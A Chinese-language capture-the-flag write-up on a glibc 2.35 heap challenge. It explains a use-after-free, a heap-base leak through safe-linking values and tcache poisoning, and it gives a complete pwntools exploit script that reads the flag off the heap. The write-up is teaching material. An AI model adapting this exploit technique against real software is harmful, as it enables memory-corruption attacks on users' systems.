House of Water.

這題名字指向 2.34+ 的 FSOP 技巧,但真正的破口簡單得多:程式把 flag 提早讀進了 heap,而 free 之後沒有清空指標,留下一個 use-after-free。用 tcache poisoning 做一次任意讀,就結束了。

PIE Full RELRO NX Canary libc 2.35 glibc heap
TL;DR

一句話版本

free 不清指標 + edit/show 不擋已釋放的 chunk ⇒ UAF。洩漏 heap(safe-linking 的 next),把 tcache 的 next 毒化成 heap+0x290,兩次 malloc 後回傳的指標 user data 正好落在 flag 上,直接 show 出來。

§0

先修環境:附的 loader 是錯的

題目附了三個檔案,但 ld 與 libc 版本對不上:

檔案版本
libc.so.6Ubuntu GLIBC 2.35-0ubuntu3.15正確
ld-linux-x86-64.so.2Ubuntu GLIBC 2.39-0ubuntu8.8錯誤

用附的 loader 跑,連選單都到不了,直接:

shell
$ ./ld-linux-x86-64.so.2 --library-path . ./chal
*** stack smashing detected ***: terminated

原因:loader 要負責設定 TLS 與 canary(fs:0x28)的初始值。2.39 的 loader 與 2.35 的 libc 對 TLS 佈局的認知不同,__stack_chk_fail 就從第一行開始亂叫。換一個 2.35 的 loader 即可:

shell
patchelf --set-interpreter /path/to/glibc-2.35/ld-linux-x86-64.so.2 \
         --set-rpath '$ORIGIN' ./chal_patched
坑

如果沒有對應的 loader,可以找同一條 2.35 支線(例如 2.35-0ubuntu3.14)的 loader 頂著用,通常能跑;但別拿 2.39 / 2.42 的 loader 硬上。

§1

偵查

先把保護和 libc 看清楚,因為這決定了整條路線。這個 glibc 版本有兩個關鍵變化,直接判了「傳統 hook」的死刑:

  • 2.34 起移除 __free_hook / __malloc_hook。想蓋函式指標拿 rip 的老路不通了——這正是題名 house of water 的由來,那個技巧是繞過 hook、改用 _IO_wfile_jumps 這類 wide-data FSOP。
  • 2.32 起 tcache 的 next 有 safe-linking:存進去的是 ptr ^ (位址 >> 12)。
  • 2.34 起 tcache 的 key 欄位被隨機化:不再是 tcache 指標,而是一個亂數 tcache_key(防 double-free)。這會讓「讀 key 拿 heap 指標」的老招失效。
重點

這題不需要 rip。等看到 §4 的 heap 佈局就知道,flag 早就在記憶體裡了,我們只要一個「任意讀」。

§2

程式邏輯

一個標準的 heap 菜單,索引 0..0x3f,三張全域表:chunks[](指標)、sizes[](大小)、freed[](每格一個 byte 的旗標)。

pseudo
1) malloc  Index: Size:    chunks[i]=malloc(size); sizes[i]=size; freed[i]=0
2) free    Index:          free(chunks[i]); freed[i]=1        // 沒檢查、沒清空
3) edit    Index: Offset: Length: Data     fread(chunks[i]+off, 1, len, stdin)
4) show    Index: Offset: Length:          逐 byte 印 hex
5) exit

所有 offset 都經過 check_bounds:

check_bounds.c
if (len <= 0 || len > 0x400) die();
long min = freed[idx] ? -16 : 0;        // 已 free 的 chunk:offset 可以到 -16
if (off < min) die();
if (off + len > sizes[idx]) die();      // 上界 = 當初請求的 size

看起來有做檢查,但 freed 這個旗標不是「禁止存取」,只是「放寬下界到 -16」。真正缺的檢查在 do_free。

§3

漏洞:Use-After-Free

do_free 只做了 free(chunks[idx]) 和 freed[idx]=1。指標沒有清成 NULL,而且 edit / show 都沒有阻擋「已釋放的 chunk」。所以 free 之後那格索引依然可以讀、可以寫——這不是 overflow,是 UAF。

附帶一提,do_free 也沒擋重複 free,所以 double-free 也成立。不過這題用不到——單次 free 就夠了。

§4

關鍵佈局:flag 就在 heap 上

setup() 在任何選單操作之前就先把 flag 讀進了 heap:

setup.c
p = malloc(0x80);
memset(p, 0, 0x80);
fp = fopen("./flag.txt", "r");
fgets(p, 0x80, fp);      // ★ flag 直接落在 heap 上
fclose(fp);

用 gdb 看 heap 開頭,佈局固定:

策略

目標位址 heap+0x2a0 是死的。我們只要讓某次 malloc 回傳一個「user data 落在 flag 上」的假 chunk,然後 show 它即可。而 heap 位址可以完整洩漏出來。

§5

洩漏 heap

tcache 的 key 欄位在 2.34 之後被換成亂數,不能再用。改用 next。safe-linking 的規則是:寫入的值 = ptr ^ (欄位位址 >> 12)。剛好 free 進「空的 bin」時,前一個節點是 NULL:

python
free(A)   # bin 空 → A.next = 0 ^ (A>>12) = A>>12
free(B)   # B.next = (B>>12) ^ A

fdA = u64(show(0, 0, 8))   # = A>>12
fdB = u64(show(1, 0, 8))   # = (B>>12) ^ A
A_full = fdB ^ fdA         # A、B 同一個 4K page ⇒ B>>12 == A>>12
heap   = fdA << 12         # heap 是 page 對齊,而 A 就落在那頁

兩個小 chunk 相鄰配置,一定同一個 4KB 頁,所以 B>>12 == A>>12,把 fdA 當成遮罩就能還原出 A 的完整位址;而 heap base 是頁對齊的,fdA << 12 就是它。

§6

Tcache poisoning

UAF write 可以直接改「已釋放 chunk」的 next(offset 0 在 freed 時是允許的),於是我們能讓某個 tcache bin 的下一個節點指向任意位址。

這裡有個細節:tcache_get 每 pop 一次就會 counts--。要「先讓 entries 變成我們控制的位址、再 pop 一次把那個位址拿出來」,過程中 counts 必須 ≥ 1——所以 bin 裡要放 兩個 entry。

為什麼挑 T = heap+0x290?因為 tcache_get 取出節點時會寫 e->key = 0 到 T+8:

  • T+8 = heap+0x298 是 flag chunk 的 size 欄位,被寫成 0 無所謂(我們只讀不 free)。
  • user data T+0x10 = heap+0x2a0 正是 flag——沒有被動到。
坑

2.35 多了 malloc(): unaligned tcache chunk detected,被毒化的位址必須 16-byte 對齊。heap+0x290 符合(0x290 & 0xf = 0)。

§7

完整 exploit

size 選 0x100 是為了讓之後 show 的長度上限夠大,能一次讀完整個 0x80 的 flag 緩衝區。

exp.py
#!/usr/bin/env python3
from pwn import *
import re
context.arch = 'amd64'
io = process('./chal_patched')   # 已 patchelf 指向 2.35 的 loader

def add(i, s):
    io.sendlineafter(b'> ', b'1')
    io.sendlineafter(b'Index: ', str(i).encode())
    io.sendlineafter(b'Size: ',  str(s).encode())
def free(i):
    io.sendlineafter(b'> ', b'2'); io.sendlineafter(b'Index: ', str(i).encode())
def edit(i, off, data):
    io.sendlineafter(b'> ', b'3'); io.sendlineafter(b'Index: ', str(i).encode())
    io.sendlineafter(b'Offset: ', str(off).encode())
    io.sendlineafter(b'Length: ', str(len(data)).encode())
    io.sendafter(b'bytes): ', data)   # 關鍵:raw,不加換行
def show(i, off, n):
    io.sendlineafter(b'> ', b'4'); io.sendlineafter(b'Index: ', str(i).encode())
    io.sendlineafter(b'Offset: ', str(off).encode())
    io.sendlineafter(b'Length: ', str(n).encode())
    b = io.recvuntil(b'1) malloc').split(b'1) malloc')[0]
    return b''.join(bytes.fromhex(h.decode()) for h in re.findall(rb'[0-9a-f]{2}', b))[:n]

SZ = 0x100
add(0, SZ); add(1, SZ)      # A, B(同一個 page)
free(0); free(1)            # bin: B -> A,counts = 2

fdA = u64(show(0, 0, 8))   # A>>12
fdB = u64(show(1, 0, 8))   # (B>>12) ^ A
heap = fdA << 12           # heap base

T = heap + 0x290            # 假 chunk,user data = flag − 0x10
edit(1, 0, p64(T ^ (heap >> 12)))   # 毒化 B.next
add(2, SZ)                  # pop B
add(3, SZ)                  # pop T → heap+0x290

flag = show(3, 0x10, 0x80)   # T+0x10 = flag
print('FLAG =', re.search(rb'flag\{[^}]*\}', flag).group().decode())
io.close()

沒有 flag.txt 時會讀到程式內建的佔位字串 flag{missing_flag_txt},這正好證明我們讀的確實是 setup 放進 heap 的那個緩衝區。

§8

重點回顧

  1. 漏洞是 UAF,不是 overflow。free 不清指標、edit/show 不擋已釋放的 chunk;那顆 freed 旗標只是把下界放寬到 -16 而已。
  2. 先看資料,再想招。flag 早在 setup 就進了 heap,所以這題只要「任意讀」,完全不用碰 FSOP / house of water。
  3. 2.34+ 的兩個變化要記牢:tcache 的 key 被隨機化(別再靠它 leak),以及 hooks 被移除(傳統蓋 __free_hook 拿 shell 已死)。
  4. safe-linking 也能當 leak 用:free 進空 bin 的節點,next 就是自己的 位址 >> 12;配上 page 對齊就能還原 heap。
  5. 打 heap 前先 gdb 畫佈局。heap+0x2a0、heap+0x510 這種偏移都是看來的,不是猜的。
延伸

如果這題沒有現成的 flag、必須拿 shell,才會輪到真正的 house of water:用 tcache / unsorted 任意寫,去偽造 _IO_FILE 的 _wide_data 並把 vtable 指向 _IO_wfile_jumps 附近,在 exit 的 flush 流程中劫持控制流。那條路才是題名的本體。
